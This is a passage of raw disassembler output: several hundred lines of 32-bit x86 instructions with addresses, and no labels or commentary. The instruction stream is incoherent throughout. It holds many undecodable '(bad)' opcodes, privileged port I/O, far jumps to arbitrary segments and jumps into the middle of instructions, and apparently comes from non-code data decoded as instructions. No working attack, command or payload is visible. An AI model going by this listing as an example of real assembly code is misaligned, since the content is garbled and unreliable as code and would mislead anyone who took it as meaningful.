  6a1ac9:	int3   
  6a1aca:	mov    ebx,0xb24e37a2
  6a1acf:	sub    al,0x7c
  6a1ad1:	in     al,0x47
  6a1ad3:	add    al,0xfa
  6a1ad5:	arpl   si,di
  6a1ad7:	dec    ebx
  6a1ad8:	out    dx,eax
  6a1ad9:	stos   BYTE PTR es:[edi],al
  6a1ada:	jo     0x6a1a91
  6a1adc:	jp     0x6a1aca
  6a1ade:	jbe    0x6a1ad3
  6a1ae0:	pop    ebx
  6a1ae1:	lods   eax,DWORD PTR ds:[esi]
  6a1ae2:	and    ch,BYTE PTR [eax]
  6a1ae4:	iret   
  6a1ae5:	cmp    ebp,eax
  6a1ae7:	fs cmp al,0xbf
  6a1aea:	cmp    al,0x94
  6a1aec:	adc    esp,eax
  6a1aee:	dec    ebp
  6a1aef:	out    dx,al
  6a1af0:	push   ebp
  6a1af1:	iret   
  6a1af2:	mov    WORD PTR [ebx+0x57472f14],ss
  6a1af8:	xor    al,0x2d
  6a1afa:	dec    eax
  6a1afb:	out    dx,eax
  6a1afc:	int3   
  6a1afd:	mov    edx,0x2faeb657
  6a1b02:	mov    al,0xce
  6a1b04:	push   0xcba1af2a
  6a1b09:	pop    edi
  6a1b0a:	test   DWORD PTR [edi-0x1d1a3e],ebx
  6a1b10:	cwde   
  6a1b11:	(bad)  
  6a1b12:	xchg   ebp,eax
  6a1b13:	adc    bl,BYTE PTR [edi]
  6a1b15:	test   DWORD PTR [edx+eiz*8+0x219a0883],eax
  6a1b1c:	or     eax,0x31b54231
  6a1b21:	mov    WORD PTR ds:[edi+edx*2+0x6e],?
  6a1b26:	sbb    DWORD PTR [edi+0x6ede1702],ebx
  6a1b2c:	jecxz  0x6a1b7d
  6a1b2e:	bnd ret 
  6a1b30:	xor    eax,0x5214950c
  6a1b35:	ficom  DWORD PTR [ecx-0xe]
  6a1b38:	xor    dh,al
  6a1b3a:	stos   DWORD PTR es:[edi],eax
  6a1b3b:	adc    eax,0x4ef36ef7
  6a1b40:	nop
  6a1b41:	(bad)  
  6a1b42:	xor    BYTE PTR [eax],dl
  6a1b44:	pop    esp
  6a1b45:	dec    ebx
  6a1b46:	push   0x56869445
  6a1b4b:	cmp    bh,BYTE PTR [ebx-0x3d6bc11a]
  6a1b51:	push   edi
  6a1b52:	out    0x16,eax
  6a1b54:	sbb    eax,DWORD PTR [eax-0x55e576d1]
  6a1b5a:	or     bh,BYTE PTR ds:0x29c22f17
  6a1b60:	dec    ecx
  6a1b61:	loope  0x6a1ba2
  6a1b63:	mov    edi,0x87bdb99b
  6a1b68:	mov    edx,DWORD PTR [edi]
  6a1b6a:	adc    dl,BYTE PTR [edi+0x7d95ed19]
  6a1b70:	inc    esi
  6a1b71:	ins    BYTE PTR es:[edi],dx
  6a1b72:	popa   
  6a1b73:	(bad)  
  6a1b74:	dec    esp
  6a1b75:	adc    dl,ch
  6a1b77:	sti    
  6a1b78:	add    bh,al
  6a1b7a:	adc    ch,al
  6a1b7c:	mov    eax,ds:0xd76c8e9a
  6a1b81:	pop    edx
  6a1b82:	out    0x47,al
  6a1b84:	stc    
  6a1b85:	scas   eax,DWORD PTR es:[edi]
  6a1b86:	sub    al,0xe
  6a1b88:	lea    edi,[esi-0x4be23a8b]
  6a1b8e:	ds push edx
  6a1b90:	adc    bh,bl
  6a1b92:	popa   
  6a1b93:	inc    edx
  6a1b94:	jl     0x6a1c05
  6a1b96:	fwait
  6a1b97:	je     0x6a1bd8
  6a1b99:	imul   ebp,DWORD PTR [eax],0xffffffe3
  6a1b9c:	inc    ebx
  6a1b9d:	ss adc esp,edx
  6a1ba0:	inc    edx
  6a1ba1:	outs   dx,DWORD PTR ds:[esi]
  6a1ba2:	fisubr WORD PTR ds:0xfa888b56
  6a1ba8:	mov    ds:0x1252f9ce,eax
  6a1bad:	dec    esp
  6a1bae:	sbb    DWORD PTR [edi-0x2d352c5d],esp
  6a1bb4:	mov    eax,0xbe7b839e
  6a1bb9:	adc    eax,0xccf576d6
  6a1bbe:	not    DWORD PTR [esi]
  6a1bc0:	je     0x6a1b9c
  6a1bc2:	jmp    0x5d352f9b
  6a1bc7:	daa    
  6a1bc8:	loop   0x6a1b76
  6a1bca:	les    ecx,FWORD PTR [esi]
  6a1bcc:	ins    BYTE PTR es:[edi],dx
  6a1bcd:	xchg   edi,eax
  6a1bce:	cmp    al,0x23
  6a1bd0:	adc    al,0x6
  6a1bd2:	popf   
  6a1bd3:	inc    edx
  6a1bd4:	iret   
  6a1bd5:	in     eax,dx
  6a1bd6:	retf   
  6a1bd7:	pop    esi
  6a1bd8:	test   BYTE PTR [edi-0x310de666],0xe1
  6a1bdf:	xadd   BYTE PTR cs:[ecx+0x349d36dc],ah
  6a1be7:	jle    0x6a1c02
  6a1be9:	sbb    BYTE PTR [esp+ebx*4],0x4d
  6a1bed:	sub    BYTE PTR [ecx],bl
  6a1bef:	or     BYTE PTR [ebp-0x7a28b8fe],dh
  6a1bf5:	cmp    ebx,0x5ce720de
  6a1bfb:	addr16 fnsetpm(287 only) 
  6a1bfe:	mov    fs,WORD PTR [ecx+0x5b]
  6a1c01:	adc    BYTE PTR [edi-0x5972a254],al
  6a1c07:	dec    ebx
  6a1c08:	sbb    DWORD PTR [ebp-0x1a],edx
  6a1c0b:	adc    ah,BYTE PTR [ebx+edx*2-0x58b44380]
  6a1c12:	mov    esp,0xf5b9e0ed
  6a1c17:	xor    ah,BYTE PTR [eax]
  6a1c19:	mov    esi,0xb3e4dd2a
  6a1c1e:	jb     0x6a1be9
  6a1c20:	mov    eax,ds:0x608bbccb
  6a1c25:	pop    ecx
  6a1c26:	fiadd  WORD PTR [ecx+0x76f4f930]
  6a1c2c:	icebp  
  6a1c2d:	loopne 0x6a1c75
  6a1c2f:	sub    eax,0xe3b791d2
  6a1c34:	fdivr  QWORD PTR [ecx-0x7d23a485]
  6a1c3a:	nop
  6a1c3b:	jne    0x6a1c19
  6a1c3d:	aas    
  6a1c3e:	sti    
  6a1c3f:	push   0x5d39c446
  6a1c44:	(bad)  
  6a1c45:	jmp    0x325e:0x973baa43
  6a1c4c:	jl     0x6a1be5
  6a1c4e:	fwait
  6a1c4f:	dec    esp
  6a1c50:	inc    ecx
  6a1c51:	pushf  
  6a1c52:	dec    ebp
  6a1c53:	add    DWORD PTR [ecx+0x39cd5e47],ebx
  6a1c59:	aam    0x47
  6a1c5b:	dec    esi
  6a1c5c:	cdq    
  6a1c5d:	inc    esp
  6a1c5e:	or     al,0x3f
  6a1c60:	sbb    ebx,edi
  6a1c62:	dec    ebx
  6a1c63:	repnz out dx,al
  6a1c65:	jle    0x6a1c98
  6a1c67:	and    DWORD PTR [edx-0x7dbeae0a],0xffffffa8
  6a1c6e:	inc    edi
  6a1c6f:	xor    al,0xe9
  6a1c71:	arpl   bx,si
  6a1c73:	adc    eax,ecx
  6a1c75:	jae    0x6a1c6e
  6a1c77:	mov    ebx,0xd8b6f71f
  6a1c7c:	mov    eax,ds:0xec9b1bcb
  6a1c81:	mov    ebx,0x941cbbcb
  6a1c86:	dec    edi
  6a1c87:	xchg   ebp,eax
  6a1c88:	jae    0x6a1c36
  6a1c8a:	stc    
  6a1c8b:	push   ss
  6a1c8c:	mov    es,WORD PTR [esi]
  6a1c8e:	clc    
  6a1c8f:	xor    ebp,ebp
  6a1c91:	shl    BYTE PTR [edx-0x21],1
  6a1c94:	cmp    esi,esp
  6a1c96:	cmp    dl,ah
  6a1c98:	xchg   DWORD PTR [eax-0x73],edi
  6a1c9b:	call   0xe74e:0xcf1ea9cf
  6a1ca2:	or     BYTE PTR [ecx-0x1210055f],0x42
  6a1ca9:	pushf  
  6a1caa:	js     0x6a1ccc
  6a1cac:	xchg   esp,eax
  6a1cad:	arpl   WORD PTR [ebx],dx
  6a1caf:	dec    esp
  6a1cb0:	pop    ecx
  6a1cb1:	stos   BYTE PTR es:[edi],al
  6a1cb2:	shr    esi,0xad
  6a1cb5:	inc    eax
  6a1cb6:	inc    edx
  6a1cb7:	inc    eax
  6a1cb8:	cmc    
  6a1cb9:	adc    ah,BYTE PTR [eax+0xb]
  6a1cbc:	pusha  
  6a1cbd:	mov    esi,0xb9022bbb
  6a1cc2:	mov    cs,WORD PTR [eax-0x6c]
  6a1cc5:	or     DWORD PTR [ecx+0x73a272b],edx
  6a1ccb:	inc    eax
  6a1ccc:	sbb    ebx,DWORD PTR [esi-0x53]
  6a1ccf:	sbb    ch,BYTE PTR ds:0x26cd382b
  6a1cd5:	jl     0x6a1c58
  6a1cd7:	ret    
  6a1cd8:	iret   
  6a1cd9:	xor    eax,0xe384daa2
  6a1cde:	nop
  6a1cdf:	dec    eax
  6a1ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a1ce1:	mov    esi,0xb868b92
  6a1ce6:	fnstcw WORD PTR [ecx-0x50]
  6a1ce9:	out    0xb6,al
  6a1ceb:	dec    edx
  6a1cec:	lock std 
  6a1cee:	xchg   esp,eax
  6a1cef:	jmp    0x6a1cbf
  6a1cf1:	xchg   ecx,eax
  6a1cf2:	hlt    
  6a1cf3:	sub    DWORD PTR [eax-0x7020851f],0x5e
  6a1cfa:	pop    ds
  6a1cfb:	in     al,0xbc
  6a1cfd:	je     0x6a1d0f
  6a1cff:	(bad)  
  6a1d00:	(bad)  [edi]
  6a1d02:	cmp    al,BYTE PTR [ebx-0x23f5dfc2]
  6a1d08:	pop    ebx
  6a1d09:	mov    edi,0x3e02c70
  6a1d0e:	cmp    al,0x83
  6a1d10:	aad    0xc4
  6a1d12:	pop    edi
  6a1d13:	shr    BYTE PTR [eax-0x560600d5],cl
  6a1d19:	enter  0xf864,0x6b
  6a1d1d:	pop    es
  6a1d1e:	cwde   
  6a1d1f:	jmp    0xf9df:0xb2698674
  6a1d26:	add    esi,DWORD PTR [edx-0x26]
  6a1d29:	xchg   ecx,eax
  6a1d2a:	leave  
  6a1d2b:	arpl   ax,bx
  6a1d2d:	push   esi
  6a1d2e:	(bad)
  6a1d32:	adc    al,0xdb
  6a1d34:	repz sti 
  6a1d36:	imul   BYTE PTR [ebp+edx*1+0x52def5a1]
  6a1d3d:	shl    BYTE PTR [ebx-0x38927c46],0x11
  6a1d44:	jno    0x6a1cd4
  6a1d46:	xchg   ebx,eax
  6a1d47:	aas    
  6a1d48:	out    0x86,al
  6a1d4a:	push   eax
  6a1d4b:	fdivrp st(1),st
  6a1d4d:	ins    BYTE PTR es:[di],dx
  6a1d4f:	fmul   st(1),st
  6a1d51:	cdq    
  6a1d52:	inc    edi
  6a1d53:	push   0xb71b7657
  6a1d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a1d59:	cmc    
  6a1d5a:	ret    0x8f3a
  6a1d5d:	popf   
  6a1d5e:	sub    eax,0xd7921457
  6a1d63:	fmul   DWORD PTR [edx]
  6a1d65:	dec    esp
  6a1d66:	(bad)  
  6a1d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a1d69:	imul   ebp,DWORD PTR [eax-0x4],0x73e98ddc
  6a1d70:	add    eax,0xd2823ae6
  6a1d75:	pushf  
  6a1d76:	in     al,0xf9
  6a1d78:	shl    eax,cl
  6a1d7a:	ror    ah,1
  6a1d7c:	push   edi
  6a1d7d:	das    
  6a1d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a1d7f:	scas   eax,DWORD PTR es:[edi]
  6a1d80:	ror    DWORD PTR [ecx],1
  6a1d82:	jle    0x6a1d60
  6a1d84:	(bad)  
  6a1d86:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  6a1d88:	rcr    DWORD PTR [esi],cl
  6a1d8a:	inc    edi
  6a1d8b:	cwde   
  6a1d8c:	xor    al,0x3
  6a1d8e:	inc    ecx
  6a1d8f:	and    bh,BYTE PTR [ebp-0xf]
  6a1d92:	inc    eax
  6a1d93:	lea    edi,[eax+0x7b55a30a]
  6a1d99:	in     al,dx
  6a1d9a:	pop    ebp
  6a1d9b:	and    eax,0xb2a7ed3d
  6a1da0:	(bad)  
  6a1da1:	jns    0x6a1dd6
  6a1da3:	out    dx,eax
  6a1da4:	pop    ss
  6a1da5:	es jp  0x6a1d50
  6a1da8:	cs gs adc eax,0x3440acdf
  6a1daf:	jns    0x6a1de8
  6a1db1:	mov    ecx,0xe3f13694
  6a1db6:	push   edx
  6a1db7:	mov    al,0xa8
  6a1db9:	into   
  6a1dba:	data16 in al,dx
  6a1dbc:	ins    DWORD PTR es:[edi],dx
  6a1dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a1dbe:	mov    bh,0x90
  6a1dc0:	push   es
  6a1dc1:	fdivr  st(2),st
  6a1dc3:	jno    0x6a1e38
  6a1dc5:	fistp  QWORD PTR [edi]
  6a1dc7:	hlt    
  6a1dc8:	adc    eax,0x14289092
  6a1dcd:	ja     0x6a1dd4
  6a1dcf:	dec    eax
  6a1dd0:	mov    BYTE PTR [eax+0x15861288],0x8d
  6a1dd7:	ins    BYTE PTR es:[edi],dx
  6a1dd8:	(bad)  
  6a1dd9:	(bad)  
  6a1dda:	rol    ebp,cl
  6a1ddc:	into   
  6a1ddd:	and    eax,0x6fa6ad88
  6a1de2:	jo     0x6a1de9
  6a1de4:	daa    
  6a1de5:	xor    al,0xe0
  6a1de7:	xchg   ebx,eax
  6a1de8:	xchg   esp,eax
  6a1de9:	adc    dh,BYTE PTR [ebx+0x36]
  6a1dec:	je     0x6a1e1a
  6a1dee:	adc    eax,0x8905bea6
  6a1df3:	mov    eax,0x798fc1b4
  6a1df8:	pop    es
  6a1df9:	lock mov edi,0x72c9b3bf
  6a1dff:	jle    0x6a1e31
  6a1e01:	(bad)  
  6a1e03:	jne    0x6a1ddc
  6a1e05:	ja     0x6a1df2
  6a1e07:	mov    al,0x66
  6a1e09:	mov    dh,0x64
  6a1e0b:	int    0xd2
  6a1e0d:	xor    dl,BYTE PTR [edx+0x3e771874]
  6a1e13:	inc    eax
  6a1e14:	(bad)  
  6a1e16:	push   ecx
  6a1e17:	xor    cl,BYTE PTR [esp+edx*4-0x45f51291]
  6a1e1e:	rcr    DWORD PTR [ebx+eiz*4+0xeb80dc6],1
  6a1e25:	jmp    0x6a1df3
  6a1e27:	jmp    0x178caead
  6a1e2c:	adc    DWORD PTR [ecx],ecx
  6a1e2e:	mov    ebp,0x760b711c
  6a1e33:	xchg   edi,eax
  6a1e34:	ds nop
  6a1e36:	mov    eax,0xa1a7fd9b
  6a1e3b:	push   edi
  6a1e3c:	out    0x3,eax
  6a1e3e:	mov    dh,ah
  6a1e40:	loopne 0x6a1dff
  6a1e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a1e43:	test   BYTE PTR [eax+0x6c],ch
  6a1e46:	xchg   edx,eax
  6a1e47:	test   BYTE PTR [ecx+0x601043d0],dh
  6a1e4d:	ja     0xb4f1ff12
  6a1e53:	mov    bl,0x63
  6a1e55:	cmc    
  6a1e56:	sbb    al,0x50
  6a1e58:	pusha  
  6a1e59:	sti    
  6a1e5a:	mov    ds:0xc4137d95,eax
  6a1e5f:	and    bl,bh
  6a1e61:	cdq    
  6a1e62:	xchg   esp,eax
  6a1e63:	mov    edx,0x2b874b42
  6a1e68:	adc    eax,0x89f1da40
  6a1e6d:	push   esi
  6a1e6e:	sub    al,0x6c
  6a1e70:	xor    al,0x9e
  6a1e72:	jae    0x6a1e9e
  6a1e74:	mov    ds:0x841cd0f8,eax
  6a1e79:	dec    ecx
  6a1e7a:	mov    bh,0xcc
  6a1e7c:	push   ebx
  6a1e7d:	dec    ebx
  6a1e7e:	push   ss
  6a1e7f:	test   al,0x85
  6a1e81:	mov    edi,0x91ccd8b9
  6a1e86:	jnp    0x6a1ef7
  6a1e88:	mov    ch,0x66
  6a1e8a:	shl    BYTE PTR [ebx+0x2a0b14b4],cl
  6a1e90:	push   0xffffff81
  6a1e92:	add    bl,BYTE PTR [esi-0x91a95c]
  6a1e98:	fwait
  6a1e99:	loopne 0x6a1e34
  6a1e9b:	int    0xd1
  6a1e9d:	imul   eax,edi,0xe5a63ebc
  6a1ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a1ea4:	aaa    
  6a1ea5:	call   0x8272bd0c
  6a1eaa:	cmp    eax,0x6a40ef36
  6a1eaf:	or     bh,BYTE PTR [edi+0x6a]
  6a1eb2:	sti    
  6a1eb3:	aaa    
  6a1eb4:	je     0x6a1e6d
  6a1eb6:	push   ecx
  6a1eb7:	push   edx
  6a1eb8:	(bad)  
  6a1eb9:	int    0x9a
  6a1ebb:	out    0x43,eax
  6a1ebd:	pusha  
  6a1ebe:	les    esp,FWORD PTR [eax]
  6a1ec0:	mov    fs,WORD PTR [edi]
  6a1ec2:	jecxz  0x6a1e66
  6a1ec4:	dec    edi
  6a1ec5:	mov    ebp,0x99804364
  6a1eca:	jl     0x6a1f2e
  6a1ecc:	sub    DWORD PTR [eax],esp
  6a1ece:	push   ebp
  6a1ecf:	ds int 0x86
  6a1ed2:	push   ds
  6a1ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a1ed4:	(bad)  
  6a1ed6:	adc    DWORD PTR [edx-0x7a502ec4],esp
  6a1edc:	pop    esi
  6a1edd:	popa   
  6a1ede:	xor    al,0xcd
  6a1ee0:	out    0x99,al
  6a1ee2:	jo     0x6a1f35
  6a1ee4:	and    esi,DWORD PTR [eax+0x6a347b15]
  6a1eea:	enter  0x5a0a,0x71
  6a1eee:	fs test al,0x5
  6a1ef1:	mov    bl,0x42
  6a1ef3:	xchg   esp,eax
  6a1ef4:	outs   dx,BYTE PTR ds:[esi]
  6a1ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a1ef6:	ins    DWORD PTR es:[edi],dx
  6a1ef7:	adc    ax,0x1557
  6a1efb:	(bad)  
  6a1efc:	fcomp  DWORD PTR [ecx+0x13]
  6a1eff:	jns    0x6a1e97
  6a1f01:	pop    esp
  6a1f02:	fcomi  st,st(0)
  6a1f04:	stos   BYTE PTR es:[edi],al
  6a1f05:	arpl   WORD PTR [ebx-0x64],bp
  6a1f08:	or     eax,0xf1e284e5
  6a1f0d:	fwait
  6a1f0e:	cmc    
  6a1f0f:	jb     0x6a1eb1
  6a1f11:	adc    edx,DWORD PTR [ebp+0x6c270a3f]
  6a1f17:	mov    eax,0x2e107747
  6a1f1c:	cmp    DWORD PTR [ebp-0x16ef6c77],eax
  6a1f22:	mov    ds:0x434dc90c,eax
  6a1f27:	mov    ch,0xcd
  6a1f29:	pushf  
  6a1f2a:	pusha  
  6a1f2b:	hlt    
  6a1f2c:	addr16 (bad) 
  6a1f2e:	or     edx,DWORD PTR [edx-0x352e00b]
  6a1f34:	mov    dh,0x54
  6a1f36:	push   ss
  6a1f37:	or     DWORD PTR ss:[ecx+0x518b8068],esp
  6a1f3e:	fwait
  6a1f3f:	ror    BYTE PTR [ebx+0x39dd7c9d],cl
  6a1f45:	int    0x4
  6a1f47:	fld    TBYTE PTR [esi]
  6a1f49:	or     ah,ch
  6a1f4b:	adc    ecx,DWORD PTR ds:0x21bb0116
  6a1f51:	in     eax,0xe4
  6a1f53:	into   
  6a1f54:	push   ss
  6a1f55:	fdivr  QWORD PTR [ebx-0xd]
  6a1f58:	out    0x55,eax
  6a1f5a:	retf   
  6a1f5b:	ret    0xa1e1
  6a1f5e:	mov    ebx,0x4b5f4be5
  6a1f63:	out    0xf5,eax
  6a1f65:	dec    ebp
  6a1f66:	push   esi
  6a1f67:	fdiv   QWORD PTR [esi-0x703b9eb7]
  6a1f6d:	inc    ecx
  6a1f6e:	cmp    eax,0x6016be5b
  6a1f73:	test   eax,0x185655fa
  6a1f78:	xchg   BYTE PTR [edx+ebx*8+0x77db7cb4],bl
  6a1f7f:	fcom   st(2)
  6a1f81:	bswap  ebx
  6a1f83:	test   eax,0x93535169
  6a1f88:	jmp    FWORD PTR [ecx]
  6a1f8a:	sub    al,0x61
  6a1f8c:	test   eax,0xf32c29d4
  6a1f91:	or     al,0x2f
  6a1f93:	adc    DWORD PTR [edx-0x60f679a7],esp
  6a1f99:	call   DWORD PTR [edx+0x275bcd5a]
  6a1f9f:	and    eax,0xf947a54e
  6a1fa4:	lods   eax,DWORD PTR ds:[esi]
  6a1fa5:	mov    eax,ds:0x2cfd7877
  6a1faa:	in     eax,0xd2
  6a1fac:	mov    WORD PTR [ebx],gs
  6a1fae:	mov    edi,0x29099445
  6a1fb3:	inc    edi
  6a1fb4:	adc    DWORD PTR [ecx+0x525b6173],eax
  6a1fba:	and    BYTE PTR [eax],cl
  6a1fbc:	jp     0x6a1f97
  6a1fbe:	push   esi
  6a1fbf:	add    esp,DWORD PTR [edi-0x52]
  6a1fc2:	sbb    eax,0x6e154acf
  6a1fc7:	in     al,dx
  6a1fc8:	(bad)  ds:0x25e6f11b
  6a1fce:	sti    
  6a1fcf:	sub    BYTE PTR [ebx+0x39079aa3],dh
  6a1fd5:	std    
  6a1fd6:	daa    
  6a1fd7:	popf   
  6a1fd8:	fmul   DWORD PTR [esi]
  6a1fda:	int3   
  6a1fdb:	push   0xc4d94837
  6a1fe0:	pop    eax
  6a1fe1:	sti    
  6a1fe2:	adc    BYTE PTR [ebx],ch
  6a1fe4:	lahf   
  6a1fe5:	lahf   
  6a1fe6:	loope  0x6a1fe7
  6a1fe8:	sbb    DWORD PTR [ebx+edi*8-0x33d1667a],ebx
  6a1fef:	push   edi
  6a1ff0:	add    BYTE PTR [edi+0x1],0xba
  6a1ff4:	lahf   
  6a1ff5:	inc    eax
  6a1ff6:	ins    DWORD PTR es:[edi],dx
  6a1ff7:	enter  0x59c,0x6b
  6a1ffb:	pop    es
  6a1ffc:	jo     0x6a2053
  6a1ffe:	inc    edx
  6a1fff:	jp     0x6a1ff7
  6a2001:	cmp    BYTE PTR [ebp+0x73],cl
  6a2004:	dec    ecx
  6a2005:	je     0x6a1fc6
  6a2007:	je     0x6a2085
  6a2009:	(bad)  
  6a200b:	mov    edx,0x49e0537d
  6a2010:	and    ah,dh
  6a2012:	or     ecx,DWORD PTR [esi]
  6a2014:	jns    0x6a1f9e
  6a2016:	mov    dl,0x4f
  6a2018:	stc    
  6a2019:	jb     0x6a1ff5
  6a201b:	jo     0x6a2034
  6a201d:	aad    0x7f
  6a201f:	mov    esi,0xb58f205f
  6a2024:	fs sahf 
  6a2026:	cmp    edx,DWORD PTR [ecx+0x7d]
  6a2029:	adc    ah,BYTE PTR [esi+0x168f363b]
  6a202f:	sbb    eax,0x8c58eb8b
  6a2034:	repnz mov ch,0x72
  6a2037:	xchg   edi,eax
  6a2038:	fcmove st,st(5)
  6a203a:	push   ds
  6a203b:	in     eax,0xfa
  6a203d:	fldenv [edi-0xdec319b]
  6a2043:	mov    ebp,esi
  6a2045:	xor    esi,esi
  6a2047:	xchg   DWORD PTR [bx+si],edi
  6a204a:	cld    
  6a204b:	mov    ebx,0x2b900de5
  6a2050:	fld    TBYTE PTR [edx+0x1c269aa0]
  6a2056:	(bad)  
  6a2057:	in     al,0xd4
  6a2059:	(bad)  
  6a205a:	out    dx,eax
  6a205b:	xor    eax,DWORD PTR [ecx-0x7b3c2583]
  6a2061:	scas   al,BYTE PTR es:[edi]
  6a2062:	jne    0x6a2024
  6a2064:	fwait
  6a2065:	mov    cl,0x5b
  6a2067:	jge    0x6a2044
  6a2069:	pop    ss
  6a206a:	idiv   DWORD PTR [edi-0x6a9bd287]
  6a2070:	lods   eax,DWORD PTR ds:[esi]
  6a2071:	cdq    
  6a2072:	cli    
  6a2073:	or     DWORD PTR [edx*4+0x3ad3c387],edx
  6a207a:	lea    edx,[ebp+0x49]
  6a207d:	test   BYTE PTR [ebp+0x484bc69c],al
  6a2083:	inc    edx
  6a2084:	push   ebp
  6a2085:	mov    edi,0x17846167
  6a208a:	dec    esi
  6a208b:	repz dec ebx
  6a208d:	pop    edi
  6a208e:	inc    esp
  6a208f:	jle    0x6a20f3
  6a2091:	(bad)  
  6a2093:	xchg   ebp,eax
  6a2094:	xor    BYTE PTR [ebx],dh
  6a2096:	dec    ebp
  6a2097:	ret    0x46b4
  6a209a:	out    0x1,eax
  6a209c:	sbb    DWORD PTR [ebp+0x4d2af39],edi
  6a20a2:	out    0xa1,al
  6a20a4:	bound  ebp,QWORD PTR [eax]
  6a20a6:	sti    
  6a20a7:	ret    0xdca3
  6a20aa:	cdq    
  6a20ab:	jne    0x6a2092
  6a20ad:	mov    esi,0x7974eb86
  6a20b2:	retf   
  6a20b3:	inc    eax
  6a20b4:	mov    bh,0xdf
  6a20b6:	ror    DWORD PTR [edi-0x7e1bc1ca],0xec
  6a20bd:	loop   0x6a211e
  6a20bf:	mov    esi,0x9561f8d3
  6a20c4:	push   eax
  6a20c5:	mov    bl,0x32
  6a20c7:	jmp    0xad28:0xbd3db5c1
  6a20ce:	ficomp WORD PTR [edi+eiz*4-0x4c54005b]
  6a20d5:	mov    esi,0x42efdc3
  6a20da:	js     0x6a2152
  6a20dc:	mov    dh,0xe
  6a20de:	je     0x6a215c
  6a20e0:	cmc    
  6a20e1:	(bad)  
  6a20e2:	cmp    al,0xae
  6a20e4:	(bad)  
  6a20e5:	mov    eax,ds:0x2f875167
  6a20ea:	mov    ds:0xf66d651a,al
  6a20ef:	gs loope 0x6a2108
  6a20f2:	pusha  
  6a20f3:	dec    eax
  6a20f4:	sahf   
  6a20f5:	(bad)  
  6a20f6:	add    esp,DWORD PTR [esp+edx*8-0x2a60b369]
  6a20fd:	out    0x72,eax
  6a20ff:	or     eax,0x2acac4fb
  6a2104:	jmp    0x6a2126
  6a2106:	dec    esi
  6a2107:	outs   dx,BYTE PTR ds:[esi]
  6a2108:	push   0x738c957c
  6a210d:	add    al,0x50
  6a210f:	xor    DWORD PTR [ebx+esi*1+0x6da7a231],edi
  6a2116:	nop
  6a2117:	push   eax
  6a2118:	daa    
  6a2119:	lds    edi,FWORD PTR [edi-0x435c7495]
  6a211f:	mov    BYTE PTR [edi],ah
  6a2121:	lods   al,BYTE PTR ds:[esi]
  6a2122:	xchg   ecx,eax
  6a2123:	addr16 sti 
  6a2125:	jns    0x6a2187
  6a2127:	cmp    DWORD PTR [edx],esi
  6a2129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a212a:	icebp  
  6a212b:	lea    edi,[ebp-0x2e14f7ee]
  6a2131:	mov    WORD PTR [esp+ebp*2],cs
  6a2134:	cdq    
  6a2135:	pop    eax
  6a2136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a2137:	add    DWORD PTR [ebp+0x31],esp
  6a213a:	xchg   ebp,eax
  6a213b:	xor    ecx,DWORD PTR [edi]
  6a213d:	pop    edx
  6a213e:	nop
  6a213f:	push   edx
  6a2140:	es nop
  6a2142:	repz retf 0xe2ed
  6a2146:	fwait
  6a2147:	sbb    eax,0x91c61b35
  6a214c:	scas   eax,DWORD PTR es:[edi]
  6a214d:	pop    es
  6a214e:	push   0xffffffaa
  6a2150:	mov    edi,0x30c21e0f
  6a2155:	and    BYTE PTR cs:[eax-0x40e07b04],0x79
  6a215d:	pop    edi
  6a215e:	and    BYTE PTR [edi+0x128fc54e],al
  6a2164:	imul   esi,ebp,0x2edd0f17
  6a216a:	aad    0x5a
  6a216c:	dec    edx
  6a216d:	jnp    0x6a2104
  6a216f:	jle    0x6a216b
  6a2171:	push   0xffffffad
  6a2173:	nop
  6a2174:	cmp    BYTE PTR [edi+0x226a4d26],bl
  6a217a:	addr16 jo 0x6a214d
  6a217d:	out    0xa,al
  6a217f:	adc    esp,DWORD PTR [eax-0x33cd19e7]
  6a2185:	scas   al,BYTE PTR es:[edi]
  6a2186:	sub    esp,DWORD PTR [ecx+esi*8]
  6a2189:	(bad)  
  6a218a:	pop    ds
  6a218b:	in     eax,dx
  6a218c:	lds    esp,FWORD PTR [ebp+ebp*8+0x64]
  6a2190:	xor    eax,0xdd3d11f6
  6a2195:	mov    dh,0xe8
  6a2197:	inc    esp
  6a2198:	jne    0x6a21cc
  6a219a:	jo     0x6a2155
  6a219c:	sbb    al,0xc1
  6a219e:	sahf   
  6a219f:	leave  
  6a21a0:	push   ecx
  6a21a1:	xbegin 0xc6b93551
  6a21a7:	inc    eax
  6a21a8:	mov    BYTE PTR [ebx],dh
  6a21aa:	stc    
  6a21ab:	int3   
  6a21ac:	push   edi
  6a21ad:	dec    esi
  6a21ae:	inc    edi
  6a21af:	leave  
  6a21b0:	sub    eax,0x498f390b
  6a21b5:	xchg   ebx,eax
  6a21b6:	jecxz  0x6a2180
  6a21b8:	sub    al,0xfe
  6a21ba:	pop    eax
  6a21bb:	mov    dl,0xe1
  6a21bd:	rcl    DWORD PTR [esp+eiz*4+0x3dc5d0f5],0x79
  6a21c5:	cmp    dl,dh
  6a21c7:	cdq    
  6a21c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a21c9:	in     eax,dx
  6a21ca:	mov    ebx,0xcf56b266
  6a21cf:	sti    
  6a21d0:	add    eax,0x9a495016
  6a21d5:	in     eax,0xb3
  6a21d7:	ss jae 0x6a2160
  6a21da:	or     al,0x8c
  6a21dc:	mov    dl,dh
  6a21de:	loopne 0x6a2192
  6a21e0:	ret    
  6a21e1:	mov    al,BYTE PTR ds:0xea377631
  6a21e7:	adc    DWORD PTR [esi+0x322993d3],ebp
  6a21ed:	ds push esi
  6a21ef:	aaa    
  6a21f0:	jp     0x6a2263
  6a21f2:	(bad)  
  6a21f3:	cmc    
  6a21f4:	retf   
  6a21f5:	in     eax,0xc8
  6a21f7:	jae    0x6a21ec
  6a21f9:	aaa    
  6a21fa:	ret    0x235b
  6a21fd:	add    DWORD PTR [ecx+0x73],esp
  6a2200:	daa    
